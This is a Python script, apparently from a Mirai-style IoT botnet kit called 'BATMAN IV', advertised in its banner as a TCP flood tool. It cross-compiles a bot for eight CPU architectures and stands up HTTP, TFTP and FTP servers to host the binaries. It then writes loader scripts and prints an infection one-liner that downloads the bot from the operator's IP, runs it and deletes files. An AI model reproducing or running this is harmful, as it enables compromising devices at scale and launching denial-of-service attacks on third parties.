#
#                   z   $b$$F                  |      |                                            
#                  F"  4$$P"                   |      A                                           
#                   r *$$$".c...               |     (�)                                               
#                   %-4$$$$$$$$"               |      o________________________________                                               
#                    J$*$$$$$$P                |      |$o`"Y888888888 $$ 888888888P"'o$|                                              
#                   ^r4$$$$$$"                 |      |."$$o`"Y888888 $$ 888888P"'o$$".|                                             
#                     *f*$$*"                  |      |8bo."$$o`"Y888 $$ 888P"'o$$".od8|                                            
#                   ".4 *$$$$$$.               |      |8888bo."$$o`"J $$ P"'o$$".od8888|                                               
#             4ee%.e.  .$$$$$$$$r              |      |8888888bo.$$oj $$ L$$".od8888888|                                                
#            4$$$$$$b  P$**)$$$$b              |      |"""""""""""""" $$ """"""""""""""|                                                
#         e..4$$$$$$$"     $$$$$$c.            |      |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|                                                  
#         3$$$$$$$$*"   "  ^"$$$$$$c           |      |=============; $$ :=============|                                                   
#        *$$$$$$$$$.        *$$$$$$$.          |      |888888888P"'o| $$ |o`"Y888888888|                                                    
#         ..$$$$$$$L    c ..J$$$$$$$b          |      |888888P"'o$$"j $$ l"$$o`"Y888888|                                                    
#         d"$$$$$$$F   .@$$$$$$$$$$$P"..       |      |888P"'o$$".od8 $$ 8bo."$$o`"Y888|                                                       
#      ..$$$$$$$$$$      d$$$$$$$$$$$$$$$      |      |P"'o$$".od8888 $$ 8888bo."$$o`"J|                                                        
#      =$$$$$$P"" "    .e$$$$$$$$$$$$$$$$      |      |o$$".od8888888 $$ 8888888bo.$$ojf                                                        
#        *""          $**$$$$$$$$$$$$$$*       |      |""""""""""""""""""""""""""""""""'                                                       
#                         "".$$$$$$$$$C .      |      |                                                        
#                      .z$$$$$$$$$$$$$$""      |      |                                                                                        
#                     .$$$*"^**"  "            |      |                                                  
#                   =P"  "                     |      |                                         
#                             britain gang     |                     
#
#___________________________________________
#
#  Usages: gcc script.c -o script -pthread
# __________________________________________________________
#
#        | DEVELOPMENT: Blazing[Hugo]  |
#        ___________________________
#
#            IG - @blazing_runs
# __________________________________________________________
#
#  ╔═════════════════════════╗╔═════════════════════════╗
#  ║         BATMAN IV       ║║      BATMAN IV        ║
#  ║           ---           ║║═════════════════════════║
#  ║           V4.3          ║║═════════════════════════║
#  ║   TCP BASED FLOOD       ║║    @BLAZING_RUNS - IG   ║
#  ╚═════════════════════════╝╚═════════════════════════╝ V4.3
#  Features V1.0:
#  - randhex method by blazing
#  - ascii banners
#  - public methods
#    ______________
#    Features V2.0:
#    - all v1.0 features
#    - mmyip in cnc
#    ______________
#    Features V2.0:
#    - all v2.0 features
#    - randhex added
#    ______________
#    Features V2.0:
#    - all v3.0 features
#    - API function added
#    - OVH L7 method added
#    - admin users
#    __________________________________________________________
#
#                     _                         _
#                 _==/          i     i          \==
#               /XX/            |\___/|            \XX\
#             /XXXX\            |XXXXX|            /XXXX\
#            |XXXXXX\_         _XXXXXXX_         _/XXXXXX|
#           XXXXXXXXXXXxxxxxxxXXXXXXXXXXXxxxxxxxXXXXXXXXXXX
#          |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
#          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
#          |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
#           XXXXXX/^^^^"\XXXXXXXXXXXXXXXXXXXXX/^^^^^\XXXXXX
#            |XXX|       \XXX/^^\XXXXX/^^\XXX/       |XXX|
#              \XX\       \X/    \XXX/    \X/       /XX/
#                 "\       "      \X/      "       /"
#                                  !
#
#    __________________________________________________________
#

import subprocess, sys

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)
    
bot = sys.argv[1]
skid= raw_input("Y/n Get Arch - ")
if skid.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["skid.mips",   #mips  
             "skid.mpsl",   #mpsl  
             "skid.x86",    #x86   
             "skid.ppc",    #ppc   
             "skid.sparc",  #sparc 
             "skid.arm4",   #arm4  
             "skid.arm5",   #arm5  
             "skid.arm6"]   #arm6  

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',           #downloading -> mips   
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',         #downloading -> mpsl     
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',         #downloading -> x86      
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',        #downloading -> ppc       
           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',          #downloading -> sparc   
           'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',        #downloading -> arm4      
           'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',        #downloading -> arm5      
           'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2']   #downloading -> arm6           

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-x86_64",
       "cross-compiler-powerpc",
       "cross-compiler-sparc",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l",
       "cross-compiler-armv6l"]

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp")

run("yum install httpd -y")
run("sudo service httpd restart")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

run('''echo -e "listen=YES
local_enable=NO
skid_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/skid.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/skid.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
run("service xinetd restart")
run("service httpd restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b check directory /var/www/html to make sure binarys created")
print("\x1b[0mskid payload# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/skid.sh; chmod 777 skid.sh; sh skid.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *\x1b[0m")